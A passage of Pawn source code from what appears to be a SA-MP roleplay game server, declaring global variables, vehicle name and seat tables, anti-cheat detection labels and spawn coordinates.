    {1772.820556,-1553.993896,1997.359497},
    {1772.599243,-1558.090820,1997.359497},
    {1772.830444,-1562.189208,1997.359497},
    {1772.779052,-1566.480957,1997.359497},
    {1773.333129,-1570.829223,1997.359497},
        {1772.990478,-1574.863403,1997.359497},
        {1750.196289,-1575.292358,1993.670043},
        {1750.384887,-1570.991210,1993.670043},
        {1750.328857,-1566.927001,1993.670043},
        {1750.237426,-1562.639892,1993.670043},
        {1750.192626,-1558.323608,1993.670043},
        {1750.221923,-1554.190551,1993.670043},
        {1750.230834,-1549.828491,1993.670043},
        {1750.214355,-1545.564941,1993.670043},
        {1750.217773,-1541.324462,1993.670043},
        {1773.074340,-1540.996459,1993.670043},
        {1772.923828,-1545.286499,1993.670043},
        {1772.725341,-1549.537109,1993.670043},
        {1772.900634,-1553.661743,1993.670043},
        {1773.167358,-1558.037841,1993.670043},
        {1772.894531,-1562.230468,1993.670043},
        {1772.913940,-1566.348876,1993.670043},
        {1772.953735,-1570.680175,1993.670043},
        {1773.257568,-1574.920166,1993.670043}
       },
       Text3D:OAC3D,
	   Text3D:OXRR,
       bool:allcell,
       ZendanInfo[37][czInfo],
       CountDeaths [ MAX_PLAYERS ],
       StartDeathTick [ MAX_PLAYERS ],
       OwnedMashin[MAX_VEHICLES],
       MashinOwner[MAX_VEHICLES],
       OwnedMashin_2[MAX_VEHICLES],
       MashinOwner_2[MAX_VEHICLES],
       locatemashin[MAX_PLAYERS],
       KickLogin[MAX_PLAYERS],
       bool:KickLoginUsed[MAX_PLAYERS],
       IWantCar[MAX_PLAYERS],
       PriceCar[MAX_PLAYERS],
       KeyDade_2[MAX_PLAYERS],
       KeyDade[MAX_PLAYERS],
       OnCheckpoint[MAX_PLAYERS],
	   //OnYard[MAX_PLAYERS],
       bool:PlayerOnDeathing[MAX_PLAYERS],
       scar,
       scar1,
       scar2,
       scar3,
       scar4,
       scar5,
       scar6,
       scar7,
       scar8,
       scar9,
       scar10,
       scar11,
       scar12,
       scar13,
       scar14,
       scar15,
       scar16,
       scar17,
       PlayerStyle[MAX_PLAYERS],
       TimerAnnouncer[MAX_PLAYERS],
       Ghatel[MAX_PLAYERS],
       GhatelWanted[MAX_PLAYERS],
       CrimeText[MAX_PLAYERS][100],
       ManTooCom[MAX_PLAYERS],
       PBANNED[MAX_PLAYERS],
       CreatedCars[2000],
       CreatedCar = 0,
       Tax = 0,
       TaxValue = 0,
       Jackpot = 0,
       NeedMedicTime[MAX_PLAYERS],
       bool:WantedKamKonTimerValid[MAX_PLAYERS],
       WantedKamKonTimer[MAX_PLAYERS],
       bool:OnStopSpecing[MAX_PLAYERS],
       BusLevel[MAX_PLAYERS],
       BusLevelLV[MAX_PLAYERS],
       LightsSTATE[MAX_VEHICLES],
       EngineSTATE[MAX_VEHICLES],
       bonnetSTATE[MAX_VEHICLES],
       bootSTATE[MAX_VEHICLES],
       engine,
       lights,
       alarm,
       doors,
       bonnet,
       boot,
       objective,
       gNewb[MAX_PLAYERS],
       Text:JailTextDraw[MAX_PLAYERS],
       PlayerFahmid[MAX_PLAYERS],
       Medics = 0,
       MedicCall = INVALID_PLAYER_ID,
       MedicCallTime[MAX_PLAYERS],
       MedicAccepted[MAX_PLAYERS],
       IWantMedic[MAX_PLAYERS],
       FindAccepted[MAX_PLAYERS],

	   VehOwned[MAX_VEHICLES],
       VehOwner[MAX_VEHICLES],

       Mechanics = 0,
       MechanicCall = INVALID_PLAYER_ID,
       MechanicCallTime[MAX_PLAYERS],
       MechanicAccepted[MAX_PLAYERS],
       IWantMechanic[MAX_PLAYERS],
       TaxiDrivers = 0,
       TaxiCall = INVALID_PLAYER_ID,
       //bool:TimerRunning[MAX_PLAYERS],
       TaxiCallTime[MAX_PLAYERS],
       TaxiAccepted[MAX_PLAYERS],
       IAcceptTaxi[MAX_PLAYERS],
       IWantTaxi[MAX_PLAYERS],
//       BusDrivers = 0,
       TransportDuty[MAX_PLAYERS],
       TransportValue[MAX_PLAYERS],
       TransportMoney[MAX_PLAYERS],
       TransportTime[MAX_PLAYERS],
       TransportCost[MAX_PLAYERS],
       TransportDriver[MAX_PLAYERS],
       JobDuty[MAX_PLAYERS],
       MedicDuty[MAX_PLAYERS],
       DateOfRekord[60],
       AtmTime[MAX_PLAYERS],
       UseAtm[MAX_PLAYERS],
       SellApproval[MAX_PLAYERS],
       BuyApproval[MAX_PLAYERS],
       ApprovalPriceOffer[MAX_PLAYERS],
       gateopen1,
       gateopen2,
       gateopen3,
       gateopen4,
       gateopen5,
       gateopen6,
       gateopen7,
       gateopen8,
       gateopen9,
       gateopen10,
       gateopen15,
       gateopen20,
       gateopen21,
	   gateopen22,
	   gateopen23,
	   yardopen,
	   reportopen,
	   pbdg,
	   pbsl,
	   pbsg,
	   pbss,
	   pbcs,
	   pbmp,
	   pbsr,
	   pbak,
	   pbm4,
	   pbcr,
	   balsys1,
	   balsys2,
       SellFree[MAX_PLAYERS],
       BuyFree[MAX_PLAYERS],
       FreePriceOffer[MAX_PLAYERS],
       randomsms[MAX_PLAYERS],
       OnSellCar[MAX_PLAYERS],
       SchoolSpawn[MAX_PLAYERS],
       TaxiSpawn[MAX_PLAYERS],
       TakingLesson[MAX_PLAYERS],
       TakingsiLesson[MAX_PLAYERS],
       UsedFind[MAX_PLAYERS],
       WatchingTV[MAX_PLAYERS],
       NoFuel[MAX_PLAYERS],
       MatsHolding[MAX_PLAYERS],
       DivorceOffer[MAX_PLAYERS],
       MarriageCeremoney[MAX_PLAYERS],
       AgentHitID[MAX_PLAYERS],
       AgentContractID[MAX_PLAYERS],
       bool:AgentContractIDUsed[MAX_PLAYERS],
       ContractID[MAX_PLAYERS],
       bool:ContractIDUsed[MAX_PLAYERS],
       ContractsCount,
       AgentHiterID[MAX_PLAYERS],
       ProposeOffer[MAX_PLAYERS],
       ProposedTo[MAX_PLAYERS],
       GotProposedBy[MAX_PLAYERS],
       MarryWitness[MAX_PLAYERS],
       MarryWitnessOffer[MAX_PLAYERS],
       TicketOffer[MAX_PLAYERS],
       TicketMoney[MAX_PLAYERS],
       SpawnChange[MAX_PLAYERS],
       TutTime[MAX_PLAYERS],
       TutTime1[MAX_PLAYERS],
       PlayerTazeTime[MAX_PLAYERS],
       FindTimePoints[MAX_PLAYERS],
       FindTime[MAX_PLAYERS],
       MedicTime[MAX_PLAYERS],
       MedicBill[MAX_PLAYERS],
       PlayerCuffed[MAX_PLAYERS],
       PlayerHandsCuffed[MAX_PLAYERS],
       PlayerCuffedTime[MAX_PLAYERS],
       LiveOffer[MAX_PLAYERS],
       TalkingLive[MAX_PLAYERS],
       SelectCharID[MAX_PLAYERS],
       SelectCharPlace[MAX_PLAYERS],
       ChosenSkin[MAX_PLAYERS],
       ApprovedLawyer[MAX_PLAYERS],
       CallLawyer[MAX_PLAYERS],
       WantLawyer[MAX_PLAYERS],
       CP[MAX_PLAYERS],
       RCP[MAX_PLAYERS],
       AnimPlay[MAX_PLAYERS],
       MoneyMessage[MAX_PLAYERS],
       RepairOffer[MAX_PLAYERS],
       RepairPrice[MAX_PLAYERS],
       RefillOffer[MAX_PLAYERS],
       RefillPrice[MAX_PLAYERS],
       RepairCar[MAX_PLAYERS],
       MaxSorat[MAX_VEHICLES],
       News[8][newsenum],
       Text3D:hotdog[MAX_PLAYERS],
       bool:IsValidAVeh[MAX_VEHICLES],
       DrugOffer[MAX_PLAYERS],
       DrugSell[MAX_PLAYERS],
       DrugPrice[MAX_PLAYERS],
       DrugGram[MAX_PLAYERS],

	   MatxOffer[MAX_PLAYERS],
       MatxSell[MAX_PLAYERS],
       MatxPrice[MAX_PLAYERS],
       MatxGram[MAX_PLAYERS],


       sHealOffer[MAX_PLAYERS],
    //   sHealSell[MAX_PLAYERS],
       sHealPrice[MAX_PLAYERS],

       WantedPoints[MAX_PLAYERS],
       WantedLevel[MAX_PLAYERS],
       OnDuty[MAX_PLAYERS],
       gPlayerLogged[MAX_PLAYERS],
       gPlayerLogTries[MAX_PLAYERS],
       gPlayerSpawned[MAX_PLAYERS],
       gLastCar[MAX_PLAYERS],
       gOoc[MAX_PLAYERS],
       OnEnteringVeh[MAX_PLAYERS],
       OnEnteringVehPlay[MAX_PLAYERS],
       bool:PlayDeathingCamera[MAX_PLAYERS],
       gNews[MAX_PLAYERS],
       gFam[MAX_PLAYERS],
       BigEar[MAX_PLAYERS],
       CellTime[MAX_PLAYERS],
       StartTime[MAX_PLAYERS],
       RentedVehicle[MAX_PLAYERS],
       Specing[MAX_PLAYERS],
       Specing2[MAX_PLAYERS],
       PhoneOnline[MAX_PLAYERS],
       gDice[MAX_PLAYERS],
       Fixr[MAX_PLAYERS],
       Float:GoBack[MAX_PLAYERS][3],
       GoBack1[MAX_PLAYERS][5],
       Mobile[MAX_PLAYERS],
       CallCost[MAX_PLAYERS],
       AFK[MAX_PLAYERS],
       oldColor[MAX_PLAYERS],
       warntime[MAX_PLAYERS],
       towtimer[MAX_PLAYERS],
       TurfTime[100],
       gLastDriver[MAX_VEHICLES],
       gCarLock[MAX_VEHICLES],
       Float:rx,
       Float:ry,
       Float:rz,
       ghour = 0,
       gminute = 0,
       gsecond = 0,
       levelcost = 100,
       realchat = 1,
       timeshift = 0,
       shifthour,
       levelexp = 2,
       DynamicFactions[22][Factions],
       DynamicClans[22][Clans],
       OnSpecPlayer[MAX_PLAYERS],
       AntiKhoonHack[MAX_PLAYERS],
       PlayerFish[MAX_PLAYERS],
       Float:Teleportevent[3],
	   Telportevent[5],
       cchargetime = 60,
       pickups,
       Float:ChangePos[MAX_PLAYERS][3],
       ChangePos2[MAX_PLAYERS][2],
       Float:TeleportDest[MAX_PLAYERS][3],
	   Float:TeleportDest2[MAX_PLAYERS][3],
       TelportEtela[MAX_PLAYERS][5],
       TelportEtela2[MAX_PLAYERS][5],
       Float:TelePos2[MAX_PLAYERS][3],
       Float:TelePos[MAX_PLAYERS][6],
       engineOn[MAX_VEHICLES],
       gEngine[MAX_PLAYERS],
       KnockedDown[MAX_PLAYERS],
       OwnableCarOffer[MAX_PLAYERS],
       OwnableCarID[MAX_PLAYERS],
       OwnableCarPrice[MAX_PLAYERS],
       BlindFold[MAX_PLAYERS],
       Reported[MAX_PLAYERS],
       Helpme[MAX_PLAYERS],
       HelpmeText[MAX_PLAYERS][100],
       ReportText[MAX_PLAYERS][100],
       HealthAllowedForPlayer[MAX_PLAYERS],
       HidePM[MAX_PLAYERS],
       wepidw[MAX_PLAYERS],
       Ammom[MAX_PLAYERS],
       IsSmoking[MAX_PLAYERS],
       UsingSmokeAnim[MAX_PLAYERS],
       CreatingGun[MAX_PLAYERS],
       CreatingGunAmmo[MAX_PLAYERS],
       CreatingGunPrice[MAX_PLAYERS],
       IsPuttingMaterials[MAX_PLAYERS],
       IsTakingGun[MAX_PLAYERS],
       HitmanTofangPackage[MAX_PLAYERS],
       Refueling[MAX_PLAYERS],
       VehiclePassengerSlots[212] =
       {
            3,//landstalker
            1,//Bravura
            1,//Buffalo
            1,//LinnerRunner
            3,//Perrenial
            3,//Sentinel
            0,//Dumper
            1,//Firetruck
            1,//TrashMaster
            3,//Stretch
            1,//Manana
            1,//Infernus
            1,//Voodoo
            3,//Pony
            1,//Mule
            1,//Cheetah
            3,//Ambulance
            1,//Leviathan
            3,//Moonbeam
            1,//Esperanto
            3,//Taxi
            3,//Washington
            1,//Bobcat
            1,//Mr Whoopee
            1,//Bf Injection
            0,//Hunter
            3,//Premier
            3,//Enforcer
            3,//Securicar
            1,//Banshee
            0,//Predator(Police Boat)
            8,//Bus
            0,//Rhino
            1,//Barracks
            1,//Hotknife
            0,//Article Trailer
            1,//Previon
            8,//Coach
            3,//Cabbie
            1,//Stallion
            3,//Rumpo
            0,//RC Bandit
            1,//Romero
            1,//Packer
            1,//Monster
            3,//Admiral
            0,//Squalo
            1,//SeaSparrow
            0,//PizzaBoy
            5,//Tram
            0,//Article Trailer 2
            1,//Turismo
            0,//Speeder
            0,//Reefer
            0,//Tropic
            1,//Flatbed
            1,//Yankee
            1,//Caddy
            3,//Soliar
            3,//Berkley's RC Van
            1,//Skimmer
            1,//PCJ-600
            1,//Faggio
            1,//Freeway
            1,//RC Baron
            1,//RC Raider
            3,//Glendale
            3,//Oceanic
            1,//Sanchez
            1,//Sparrow
            3,//Patriot
            1,//Quad
            0,//Coastguard
            0,//Dinghy
            1,//Hermes
            1,//Sabre
            0,//Rustler
            1,//ZR-350
            1,//Walton
            3,//Regina
            1,//Comet
            0,//BMX
            3,//Burrito
            2,//Camper
            0,//Marquis
            0,//Baggage
            0,//Dozer
            3,//Maverick
            1,//News Chopper
            1,//Rancher
            3,//FBI-Rancher
            1,//Virgo
            3,//GreenWood
            0,//Jetmax
            1,//Hotring
            1,//SandKing
            1,//Blista Compact
            3,//Police Maverick
            3,//Box Ville
            1,//BenSon
            1,//Mesa
            1,//RC Goblin
            1,//Hotring Racer A
            1,//Hotring Racer B
            1,//Bloodring Banger
            1,//Rancher
            1,//Super GT
            3,//Elegant
            1,//Journey
            0,//Bike
            0,//Mountain Bike
            1,//Beagle
            0,//Cropdust
            0,//Stunt
            1,//Tanker
            1,//RoadTrain
            3,//Nebula
            1,//Majestic
            1,//Buccaneer
            0,//Shamal
            0,//Hydra
            1,//FCR-900
            1,//NRG-500
            1,//HPV-1000
            1,//Cement Truck
            1,//Tow Truck
            1,//Fortune
            1,//Cadrona
            1,//FBI Truck
            3,//Willard
            0,//Forklift
            0,//Tractor
            0,//Combine
            1,//Feltzer
            1,//Remington
            1,//Slamvan
            1,//Blade
            5,//Freight
            5,//Streak
            0,//Vortex
            3,//Vincent
            1,//Bullet
            1,//Clover
            1,//Sadler
            1,//Firetruck LA
            1,//Hustler
            3,//Intruder
            3,//Primo
            1,//Cargobob
            1,//Tampa
            3,//Sunrise
            3,//Merit
            1,//Utility
            0,//Nevada
            1,//Yosemite
            1,//Windsor
            1,//Monster A
            1,//Monster B
            1,//Uranus
            1,//Jester
            3,//Sultan
            3,//Startum
            1,//Elegy
            1,//Raindance
            0,//RC Tiger
            1,//Flash
            3,//Tahoma
            3,//Savanna
            0,//Bandito
            0,//Freight Flat Trailer (Train)
            0,//Streak Trailer (Train)
            0,//Kart
            0,//Mower
            1,//Duneride
            0,//Sweeper
            1,//Broadway
            1,//Tornado
            1,//AT-400
            1,//Dft-30
            3,//Huntley
            3,//Stafford
            1,//BF-400
            3,//News van
            0,//Tug
            0,//Fuel trailer truck
            3,//Emperor
            1,//Wayfarer
            1,//Euros
            1,//Hotdog
            1,//Club
            0,//Freight Box Trailer (Train)
            0,//Article Trailer 3
            1,//Androma
            1,//Dodo
            1,//RC Cam
            0,//Launch
            3,//Police LSPD
            3,//Police SFPD
            3,//Police LVPD
            1,//Police Ranger
            1,//Picador
            1,//SWAT Van
            1,//Alpha
            1,//Phoenix
            3,//Gleande Shit
            1,//Sadler
            0,//Unknown
            0,//Unknown
            0,//Unknown
            3,//BoxVille
            0,//Unknown
            0//Unknown
       },
       aVehicleNames[212][] =
       {
            {"Landstalker"},
            {"Bravura"},
            {"Buffalo"},
            {"Linerunner"},
            {"Perrenial"},
            {"Sentinel"},
            {"Dumper"},
            {"Firetruck"},
            {"Trashmaster"},
            {"Stretch"},
            {"Manana"},
            {"Infernus"},
            {"Voodoo"},
            {"Pony"},
            {"Mule"},
            {"Cheetah"},
            {"Ambulance"},
            {"Leviathan"},
            {"Moonbeam"},
            {"Esperanto"},
            {"Taxi"},
            {"Washington"},
            {"Bobcat"},
            {"Mr Whoopee"},
            {"BF Injection"},
            {"Hunter"},
            {"Premier"},
            {"Enforcer"},
            {"Securicar"},
            {"Banshee"},
            {"Predator"},
            {"Bus"},
            {"Rhino"},
            {"Barracks"},
            {"Hotknife"},
            {"Trailer 1"},
            {"Previon"},
            {"Coach"},
            {"Cabbie"},
            {"Stallion"},
            {"Rumpo"},
            {"RC Bandit"},
            {"Romero"},
            {"Packer"},
            {"Monster"},
            {"Admiral"},
            {"Squalo"},
            {"Seasparrow"},
            {"Pizzaboy"},
            {"Tram"},
            {"Trailer 2"},
            {"Turismo"},
            {"Speeder"},
            {"Reefer"},
            {"Tropic"},
            {"Flatbed"},
            {"Yankee"},
            {"Caddy"},
            {"Solair"},
            {"Berkley's RC Van"},
            {"Skimmer"},
            {"PCJ-600"},
            {"Faggio"},
            {"Freeway"},
            {"RC Baron"},
            {"RC Raider"},
            {"Glendale"},
            {"Oceanic"},
            {"Sanchez"},
            {"Sparrow"},
            {"Patriot"},
            {"Quad"},
            {"Coastguard"},
            {"Dinghy"},
            {"Hermes"},
            {"Sabre"},
            {"Rustler"},
            {"ZR-350"},
            {"Walton"},
            {"Regina"},
            {"Comet"},
            {"BMX"},
            {"Burrito"},
            {"Camper"},
            {"Marquis"},
            {"Baggage"},
            {"Dozer"},
            {"Maverick"},
            {"News Chopper"},
            {"Rancher"},
            {"FBI-Rancher"},
            {"Virgo"},
            {"Greenwood"},
            {"Jetmax"},
            {"Hotring"},
            {"Sandking"},
            {"Blista Compact"},
            {"Police Maverick"},
            {"Boxville"},
            {"Benson"},
            {"Mesa"},
            {"RC Goblin"},
            {"Hotring Racer A"},
            {"Hotring Racer B"},
            {"Bloodring Banger"},
            {"Rancher"},
            {"Super GT"},
            {"Elegant"},
            {"Journey"},
            {"Bike"},
            {"Mountain Bike"},
            {"Beagle"},
            {"Cropdust"},
            {"Stunt"},
            {"Tanker"},
            {"Roadtrain"},
            {"Nebula"},
            {"Majestic"},
            {"Buccaneer"},
            {"Shamal"},
            {"Hydra"},
            {"FCR-900"},
            {"NRG-500"},
            {"HPV1000"},
            {"Cement Truck"},
            {"Tow Truck"},
            {"Fortune"},
            {"Cadrona"},
            {"FBI-Truck"},
            {"Willard"},
            {"Forklift"},
            {"Tractor"},
            {"Combine"},
            {"Feltzer"},
            {"Remington"},
            {"Slamvan"},
            {"Blade"},
            {"Freight"},
            {"Streak"},
            {"Vortex"},
            {"Vincent"},
            {"Bullet"},
            {"Clover"},
            {"Sadler"},
            {"Firetruck LA"},
            {"Hustler"},
            {"Intruder"},
            {"Primo"},
            {"Cargobob"},
            {"Tampa"},
            {"Sunrise"},
            {"Merit"},
            {"Utility"},
            {"Nevada"},
            {"Yosemite"},
            {"Windsor"},
            {"Monster A"},
            {"Monster B"},
            {"Uranus"},
            {"Jester"},
            {"Sultan"},
            {"Stratum"},
            {"Elegy"},
            {"Raindance"},
            {"RC Tiger"},
            {"Flash"},
            {"Tahoma"},
            {"Savanna"},
            {"Bandito"},
            {"Freight Flat"},
            {"Streak Carriage"},
            {"Kart"},
            {"Mower"},
            {"Duneride"},
            {"Sweeper"},
            {"Broadway"},
            {"Tornado"},
            {"AT-400"},
            {"DFT-30"},
            {"Huntley"},
            {"Stafford"},
            {"BF-400"},
            {"News Van"},
            {"Tug"},
            {"Trailer 3"},
            {"Emperor"},
            {"Wayfarer"},
            {"Euros"},
            {"Hotdog"},
            {"Club"},
            {"Freight Carriage"},
            {"Trailer 3"},
            {"Andromada"},
            {"Dodo"},
            {"RC Cam"},
            {"Launch"},
            {"Police-LSPD"},
            {"Police-SFPD"},
            {"Police-LVPD"},
            {"Police-Ranger"},
            {"Picador"},
            {"S.W.A.T. Van"},
            {"Alpha"},
            {"Phoenix"},
            {"Glendale"},
            {"Sadler"},
            {"Luggage Trailer A"},
            {"Luggage Trailer B"},
            {"Stair Trailer"},
            {"Boxville"},
            {"Farm Plow"},
            {"Utility Trailer"}
       },

	   CheatName[53][] =
       {
            {"AirBreak (onfoot)"},
			{"AirBreak (in vehicle)"},
			{"Teleport hack (onfoot)"},
			{"Teleport hack (in vehicle)"},
			{"Teleport hack (into/between vehicles)"},
			{"Teleport hack (vehicle to player)"},
			{"Teleport hack (pickups)"}, // 6
			{"FlyHack (onfoot)"},
			{"FlyHack (in vehicle)"},
			{"SpeedHack (onfoot)"},
			{"SpeedHack (in vehicle)"},
			{"Health hack (in vehicle)"},
			{"Health hack (onfoot)"},
			{"Armour hack"}, // 13
			{"Money hack"}, // 14
			{"Weapon hack"}, // 15
			{"Ammo hack (add)"}, // 16
			{"Ammo hack (infinite)"},
			{"Special actions hack"},
			{"GodMode from bullets (onfoot"}, // 19
			{"GodMode from bullets (in vehicle)"}, //20
			{"Invisible hack"},
			{"lagcomp-spoof"},
			{"Tuning hack"},
			{"Parkour mod"}, //24
			{"Quick turn"},
			{"Rapid fire"},
			{"FakeSpawn"}, //25
			{"FakeKill"},
			{"Pro Aim"},
			{"CJ run"},
			{"CarShot"},
			{"CarJack"},
			{"UnFreeze"},
			{"AFK Ghost"},
			{"Full Aiming"},
			{"Fake NPC"}, //34
			{"Reconnect"}, //35
			{"High ping"}, //36
			{"Dialog hack"}, //37
			{"Protection from the sandbox"}, //38
			{"Protection against an invalid version"}, //39
			{"Rcon hack"},
			{"Tuning crasher"},
			{"Invalid seat crasher"},
			{"Dialog crasher"}, //43
			{"Attached object crasher"}, //44
			{"Weapon Crasher"},
			{"Flood protection connects to one slot"}, //46
			{"flood callback functions"},
			{"flood change seat"},
			{"Ddos"},
			{"NOP's"} //50
       },


       Music[MAX_PLAYERS],
       OnSpeedc[MAX_PLAYERS],
       SpeedTimer[MAX_PLAYERS],
       bool:SpeedTimerUsed[MAX_PLAYERS],
       Float:PaintballSpawns[7][3] =
       {
            {-394.8027,2232.2317,42.4297},
            {-430.8412,2240.5371,42.9834},
            {-369.2361,2248.3127,42.4844},
            {-350.8910,2218.0215,42.4912},
            {-384.0544,2206.2908,42.4235},
            {-395.7100,2214.9480,42.4297},
            {-445.3718,2222.5481,42.4297}
       },
              Float:CarSpawn[10][3] =
       {
	    {1561.119750,-2309.014648,13.144052},
	    {1561.079101,-2312.241943,13.144052},
	    {1561.061523,-2315.463134,13.144052},
	    {1561.071289,-2318.999755,13.144052},
	    {1560.852905,-2321.890625,13.144052},
	    {1560.782104,-2325.338134,13.144052},
	    {1560.743530,-2328.693847,13.144052},
	    {1560.913085,-2331.875000,13.144052},
	    {1560.724609,-2335.179931,13.144052},
	    {1560.783813,-2338.635986,13.144052}
       },
       PaintBallWinner = INVALID_PLAYER_ID,
       PaintballStarted,
       PaintBallPlayers,
       PaintBallStarting,
       PaintBallLeadKills,
       OnPaintBall[MAX_PLAYERS],
       PaintBallKills[MAX_PLAYERS],
       PTime,
       PFTime,
//       KartingStarted,
       KartingPlayers,
//       KartingStarting,
//       KartingPlayersReached,
       OnKarting[MAX_PLAYERS],
       KartingPlayerTime[MAX_PLAYERS],
//	   KTime,
//	   KFTime,
       Float:gInviteSpawns[10][4] =
       {
            {-1976.5912,166.1818,36.9623,272.6393},
            {-1975.8610,162.1945,36.9623,272.0126},
            {-1975.7461,157.5404,36.9623,276.1093},
            {-1975.2136,151.4920,36.9623,268.2993},
            {-1974.9963,145.3430,36.9623,269.2628},
            {-1975.5842,140.8170,36.9623,269.8895},
            {-1975.7874,134.0368,36.9623,271.7696},
            {-1975.1681,129.0926,36.9623,270.8531},
            {-1975.9069,121.4700,36.9623,270.5631},
            {-1975.3311,112.7078,36.9623,267.7665}
		},
		TurfInfo[49][zInfo],
		Turfs[49],
		ServerTurf =9999,
		ServerWar,
		ServerTurfRang,
		PlayerInfo[MAX_PLAYERS][pInfo],
		HouseInfo[1100][hInfo],
		BizzInfo[81][bInfo],
		SBizzInfo[34][sbInfo],
		PlayerHaul[113][pHaul],
		PaymecTime[MAX_PLAYERS],
		HealthTimer[MAX_PLAYERS],
		adtimer = 0,
		adtimerplayer[MAX_PLAYERS],
		JoinPed[89][1] =
		{
            {280},//POLICE_FORCE
            {281},
            {282},
            {283},
            {284},
            {285},
            {288},
            {71},
            {55},
            {286},//FBI/ATF10
            {164},
            {163},
            {93},
            {165},
            {166},
            {93},//NATIONAL_GUARD
            {285},
            {141},//FIRE/AMBULANCE
            {274},
            {275},
            {276},
            {277},
            {278},
            {279},
            {219},
            {56},//Silence Mafia
            {191},
            {194},
            {192},
            {195},
            {190},
            {193},
            {233},//The Killers
            {98},
            {290},
            {46},
            {117},
            {120},
            {117},//HITMANS
            {118},
            {120},
            {186},
            {211},
            {240},
            {148},//NEWS_REPORTERS
            {188},
            {187},
            {190},
            {255},//TAXI_CAB_COMPANY
            {253},
            {261},
            {61},
            {56},
            {153},//DRIVING/FLYING_SCHOOL
            {194},//driving/school
            {60},//school
            {259},//school:|
            {105},//Dangerous Tigers === sabz-DangerousTigers
            {106},
            {107},
            {269},
            {270},
            {271},
            {292},
            {65},
            {122},//LegendaryMen == Zard
            {125},
            {126},
            {272},
            {127},
            {112},
            {195},
            {216},//patreno === soorati == ballas
            {102},
            {103},
            {104},
            {296},
            {55},
            {173},//StormMen
            {174},
            {175},
            {114},
            {116},
            {116},
            {214},
            {50},//TCC
            {42},
            {8},
            {225}

       },
       Float:IntArray[146][4] =
       {
            {2003.12,1015.19,33.01,351.58},{770.8,-0.7,1000.73,22.86},{974.02,-9.59,1001.15,22.6},{961.93,-51.91,1001.12,95.54},{830.6,5.94,1004.18,125.81},
            {1037.83,0.4,1001.28,353.93},{1212.15,-28.54,1000.95,170.57},{1290.41,1.95,1001.02,179.94},{1412.15,-2.28,1000.92,114.66},{1527.05,-12.02,1002.1,350.0},
            {1523.51,-47.82,1002.27,262.7},{612.22,-123.9,997.99,266.57},{512.93,-11.69,1001.57,198.77},{418.47,-80.46,1001.8,343.24},{386.53,173.64,1008.38,63.74},
            {288.47,170.06,1007.18,22.05},{206.46,-137.71,1003.09,10.93},{-100.27,-22.94,1000.72,17.29},{-201.22,-43.25,1002.27,45.86},{-202.94,-6.7,1002.27,204.27},
            {-25.72,-187.82,1003.55,5.08},{454.99,-107.25,999.44,309.02},{372.56,-131.36,1001.49,354.23},{378.03,-190.52,1000.63,141.02},{315.24,-140.89,999.6,7.42},
            {225.03,-9.18,1002.22,85.53},{611.35,-77.56,998.0,320.93},{246.07,108.97,1003.22,0.29},{6.09,-28.9,1003.55,5.04},{773.73,-74.7,1000.65,5.23},{621.45,-23.73,1000.92,15.68},
            {445.6,-6.98,1000.73,172.21},{285.84,-39.02,1001.52,0.75},{204.12,-46.8,1001.8,357.58},{245.23,304.76,999.15,273.44},{290.62,309.06,999.15,89.92},{322.5,303.69,999.15,8.17},
            {-2041.23,178.4,28.85,156.22},{-1402.66,106.39,1032.27,105.14},{-1403.01,-250.45,1043.53,355.86},{1204.67,-13.54,1000.92,350.02},{2016.12,1017.15,996.88,88.01},
            {-741.85,493.0,1371.98,71.78},{2447.87,-1704.45,1013.51,314.53},{2527.02,-1679.21,1015.5,260.97},{-1129.89,1057.54,1346.41,274.53},{2496.05,-1695.17,1014.74,179.22},
            {366.02,-73.35,1001.51,292.01},{2233.94,1711.8,1011.63,184.39},{269.64,305.95,999.15,215.66},{414.3,-18.8,1001.8,41.43},{1.19,-3.24,999.43,87.57},{-30.99,-89.68,1003.55,359.84},
            {161.4,-94.24,1001.8,0.79},{-2638.82,1407.34,906.46,94.68},{1267.84,-776.96,1091.91,231.34},{2536.53,-1294.84,1044.13,254.95},{2350.16,-1181.07,1027.98,99.19},
            {-2158.67,642.09,1052.38,86.54},{419.89,2537.12,10.0,67.65},{256.9,-41.65,1002.02,85.88},{204.17,-165.77,1000.52,181.76},{1133.35,-7.85,1000.68,165.85},{-1420.43,1616.92,1052.53,159.13},
            {493.14,-24.26,1000.68,356.99},{1727.29,-1642.95,20.23,172.42},{-202.84,-24.03,1002.27,252.82},{2233.69,-1112.81,1050.88,8.65},{1211.25,1049.02,359.94,170.93},
            {2319.13,-1023.96,1050.21,167.4},{2261.1,-1137.88,1050.63,266.88},{-944.24,1886.15,5.01,179.85},{-26.19,-140.92,1003.55,2.91},{2217.28,-1150.53,1025.8,273.73},
            {1.55,23.32,1199.59,359.91},{681.62,-451.89,-25.62,166.17},{234.61,1187.82,1080.26,349.48},{225.57,1240.06,1082.14,96.29},{224.29,1289.19,1082.14,359.87},
            {239.28,1114.2,1080.99,270.27},{207.52,-109.74,1005.13,358.62},{295.14,1473.37,1080.26,352.95},{-1417.89,932.45,1041.53,0.7},{446.32,509.97,1001.42,330.57},
            {2306.38,-15.24,26.75,274.49},{2331.9,6.78,26.5,100.24},{663.06,-573.63,16.34,264.98},{-227.57,1401.55,27.77,269.3},{-688.15,942.08,13.63,177.66},{-1916.13,714.86,46.56,152.28},
            {818.77,-1102.87,25.79,91.14},{255.21,-59.68,1.57,1.46},{446.63,1397.74,1084.3,343.96},{227.39,1114.66,1081.0,267.46},{227.76,1114.38,1080.99,266.26},{261.12,1287.22,1080.26,178.91},
            {291.76,-80.13,1001.52,290.22},{449.02,-88.99,999.55,89.66},{-27.84,-26.67,1003.56,184.31},{2135.2,-2276.28,20.67,318.59},{306.2,307.82,1003.3,203.14},{24.38,1341.18,1084.38,8.33},
            {963.06,2159.76,1011.03,175.31},{2548.48,2823.74,10.82,270.6},{215.15,1874.06,13.14,177.55},{221.68,1142.5,1082.61,184.96},{2323.71,-1147.65,1050.71,206.54},{345.0,307.18,999.16,193.64},
            {411.97,-51.92,1001.9,173.34},{-1421.56,-663.83,1059.56,170.93},{773.89,-47.77,1000.59,10.72},{246.67,65.8,1003.64,7.96},{-1864.94,55.73,1055.53,85.85},
            {-262.18,1456.62,1084.37,82.46},{22.86,1404.92,1084.43,349.62},{140.37,1367.88,1083.86,349.24},{1494.86,1306.48,1093.3,196.07},{-1813.21,-58.01,1058.96,335.32},
            {-1401.07,1265.37,1039.87,178.65},{234.28,1065.23,1084.21,4.39},{-68.51,1353.85,1080.21,3.57},{-2240.1,136.97,1035.41,269.1},{297.14,-109.87,1001.52,20.23},
